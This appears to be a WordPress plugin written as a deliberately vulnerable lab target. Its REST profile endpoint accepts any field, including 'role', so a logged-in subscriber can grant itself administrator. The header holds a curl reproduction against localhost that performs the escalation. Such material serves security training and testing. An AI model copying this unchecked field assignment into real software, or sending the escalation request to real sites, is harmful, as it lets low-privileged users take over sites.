<?php
/*
Plugin Name: BZ Mass Assignment
Description: REST profile endpoint that blindly accepts a "role" field (privilege escalation).
Version: 1.0.0
Author: Ayi NEDJIMI
Author URI: https://github.com/ayi-nedjimi
License: GPL-2.0
*/

/*
 * VULN CLASS: Mass assignment / privilege escalation (CWE-915 / OWASP A04+A01)
 *
 * POST /wp-json/bz/v1/profile accepts arbitrary fields and writes them onto the
 * current user, including "role". A subscriber can become administrator.
 *
 * Repro (authenticated as subscriber via Application Password):
 *   curl -u sub:APP_PASSWORD -X POST -H 'Content-Type: application/json' \
 *     -d '{"display_name":"hax","role":"administrator"}' \
 *     http://localhost:8080/wp-json/bz/v1/profile
 */

if (!defined('ABSPATH')) { exit; }

add_action('rest_api_init', function () {
    register_rest_route('bz/v1', '/profile', [
        'methods'             => 'POST',
        'permission_callback' => function () { return is_user_logged_in(); },
        'callback'            => 'bz_ma_update_profile',
    ]);
});

function bz_ma_update_profile(WP_REST_Request $req) {
    $uid = get_current_user_id();
    if (!$uid) { return new WP_REST_Response(['error' => 'login'], 401); }

    $data = $req->get_json_params();
    if (!is_array($data)) { $data = $req->get_params(); }

    // VULN: no allowlist - "role" flows straight through
    foreach ($data as $k => $v) {
        if ($k === 'role') {
            $u = new WP_User($uid);
            $u->set_role(sanitize_key($v));
        } else {
            wp_update_user(['ID' => $uid, $k => $v]);
        }
    }
    $user = get_userdata($uid);
    return new WP_REST_Response(['ok' => true, 'roles' => $user->roles], 200);
}
